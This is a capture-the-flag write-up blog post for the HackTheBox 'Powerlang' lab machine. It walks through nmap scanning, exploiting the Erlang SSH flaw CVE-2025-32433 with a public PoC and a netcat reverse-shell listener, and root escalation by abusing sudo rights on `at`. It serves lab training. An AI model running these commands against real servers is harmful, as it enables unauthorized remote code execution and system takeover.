---
layout: post
title: "Powerlang - CTF Writeup of Global Skills Cyber Benchmark 2025"
date: 2025-06-03
permalink: /blogs/powerlang-business-ctf-25.html
---

This blog was supposed as all of writeups that whether I've completely or partially done during the CTF challenge of HackTheBox. It was Global Skills Cyber Benchmark 2025 (previously HTB Business CTF): Operation Blackout, which I participated with my colleagues in a team.

I wish that I could re-solve CTF tasks again, especially in the after party. Due to another projects and time constraints, I can only share one write-up from the previous CTF.

---

# Fullpwn

This challenge category is based on the vulnerable HTB machines. All vulnerabilities of these challenges are based upon the novel CVE attacks and common misconfigurations that often exist, which causes various severe cyber attacks. This requires a bit knowledge of using such exploits and some knowledge of OS privilege escalations.

The challenge requires adding the machine's IP address into the virtual host, which often located under the `/etc/hosts`, before starting of this challenge. 

```
$ echo '<fullpwn-ip-address>\t fullpwn.htb\t subdomain.fullpwn.htb' | sudo tee -a /etc/hosts
```

Once it's done, we can launch the attacking network by running `openvpn` against the given VPN from the challenge. 

## Powerlang

### Nmap reconnaissance

- Scan for the open ports (`nmap 10.129.234.54`)
    
    ```
    Nmap scan report for powerlang.htb (10.129.234.54)
    Host is up (0.031s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT     STATE SERVICE
    80/tcp   open  http
    2222/tcp open  EtherNetIP-1
    ```
    - Only two ports are open (80 and 2222)

- Scan the detailed information for open ports (`sudo nmap -p 80,2222 -sCV -A 10.129.234.54`)
    
    ```
    Nmap scan report for powerlang.htb (10.129.234.54)
    Host is up (0.034s latency).
    
    PORT     STATE SERVICE VERSION
    80/tcp   open  http    Apache httpd 2.4.58
    |_http-title: Powerlang - Future of Telecommunication
    |_http-server-header: Apache/2.4.58 (Ubuntu)
    2222/tcp open  ssh     (protocol 2.0)
    | fingerprint-strings: 
    |   NULL: 
    |_    SSH-2.0-Erlang/5.2.9
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port2222-TCP:V=7.95%I=7%D=5/29%Time=683810FB%P=x86_64-pc-linux-gnu%r(NU
    SF:LL,16,"SSH-2\.0-Erlang/5\.2\.9\r\n");
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose|router
    Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
    OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
    Network Distance: 2 hops
    Service Info: Host: 127.0.1.1
    
    TRACEROUTE (using port 443/tcp)
    HOP RTT      ADDRESS
    1   29.67 ms 10.10.14.1
    2   30.78 ms powerlang.htb (10.129.234.54)
    ```
    - Port 80: Basic HTTP
    - Port 2222: Erlang SSH v.5.2.9

## Enumeration

### Service enumeration

- HTTP (not much to tell)
    ![](/assets/bizctf25-blackout/powerlang-web-ui.png)

- Erlang v5.2.9 has a CVE-2025-32433

### CVE-2025-32433

According to the several notes that I’ve read, the Erlang/OTP (Open Telecom Platform) is a type of runtime system library that runs another type of SSH system, using Erlang as their programming language. Prior to versions OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.0, as well as version Erlang 5.2.9 that the target is running, is affected by **CVE-2025-32433**, which the threat actor may be able to perform **unauthenticated remote code execution** (RCE). This vulnerability was caused by the flaw in SSH daemon due to the improper handling of their protocol messages, which allows the sending of protocol messages before authentication is completed.

The impact was significant due to the critical severity. Not only the threat actors are able to obtain arbitrary RCE, but also might be potential to a complete system compromise, including unauthorized access to sensitive data, manipulation of system resources by third parties, or denial-of-service (DoS) attacks.

## Initial foothold

### Running the exploit

This [blog](https://platformsecurity.com/blog/CVE-2025-32433-poc) explains how the writer generates the PoC exploit of CVE-2025-32433 using AI. Since there are some PoC scripts on GitHub, I found another PoC that enables us to pass the attacker’s IP address and port listener to the script. To begin, we’ll start by cloning the repository and identify on how do we run the Python exploit script.

```bash
$ git clone https://github.com/MrDreamReal/CVE-2025-32433; cd CVE-2025-32433

$ python exploit.py -h
```

![](/assets/bizctf25-blackout/exploit-script.png)

Now, we can set up our Netcat listener based on our attacker’s IP address (or VPS) and the port that in expectation, we can obtain the reverse shell through the target by providing the target’s IP address and the Erlang/OTP SSH port to the exploit script.

```bash
# Start in a different terminal, which is on the left-side
$ nc -lvnp 8655

# Launch the exploit as on the right-side of the terminal
$ python exploit.py -t 10.129.234.54 -p 2222 --lhost 10.10.14.65 --lport 8655
```

![](/assets/bizctf25-blackout/running-the-script.png)

## Privilege escalation

### Abusing Sudo rights

After we obtained the `user.txt` flag, we can determine if the user `it-operator` has any Sudo privileges by typing `sudo -l`

![](/assets/bizctf25-blackout/sudo--l.png)

Since the current user has granted root-level permissions to run `at` command, we can identify this using GTFOBins.

![](/assets/bizctf25-blackout/gtfobins-at.png)

Before we can copy-paste and run the command, we need to spawn another bash shell, due to the current shell is not yet interactive. Otherwise, we couldn’t obtain the shell as root, thus the command hangs until we exit from the reverse shell.

```bash
$ python3 -c "import pty; pty.spawn('/bin/bash')"
```

Once we spawn another Bash shell, we can copy-paste the `at` command to escalate privileges.
![](/assets/bizctf25-blackout/sudo-at-abuse.png)

# Appendix

## Sources

- [GitHub Security Advisories](https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2)
- [NIST of CVE-2025-32433](https://nvd.nist.gov/vuln/detail/CVE-2025-32433)
    - [Related Blogs](https://platformsecurity.com/blog/CVE-2025-32433-poc)
        - [Script PoC](https://github.com/ProDefense/CVE-2025-32433/tree/main?tab=readme-ov-file)
    - [Script PoC for Listener](https://github.com/MrDreamReal/CVE-2025-32433)